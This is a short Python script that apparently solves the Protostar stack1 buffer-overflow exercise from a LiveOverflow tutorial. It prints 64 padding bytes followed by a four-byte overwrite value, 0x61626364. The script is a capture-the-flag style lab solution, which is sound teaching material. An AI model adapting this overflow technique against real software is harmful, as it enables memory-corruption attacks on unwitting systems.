#!/usr/bin/python
# http://liveoverflow.com/binary_hacking/protostar/stack1.html

import struct
padding = "A"*64
eip = "\x64\x63\x62\x61" #0x61626364
print (padding + eip)
